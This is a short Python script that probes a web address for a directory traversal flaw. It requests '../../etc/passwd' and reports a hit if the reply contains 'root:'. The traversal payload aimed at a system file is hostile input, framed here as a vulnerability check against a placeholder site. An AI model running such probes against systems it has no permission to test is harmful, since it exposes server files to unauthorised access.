import requests

def check_directory_traversal_vulnerability(url):
    try:
        directory = '../../etc/passwd'
        response = requests.get(f'{url}/{directory}', allow_redirects=False)

        if response.status_code == 200 and 'root:' in response.text:
            print("Potential Directory Traversal vulnerability found!")
        else:
            print("No Directory Traversal vulnerability found.")
    except requests.RequestException as e:
        print(f"Error occurred while accessing {url}: {e}")

# URL for Directory Traversal vulnerability check
url = 'https://example.com/view'
check_directory_traversal_vulnerability(url)
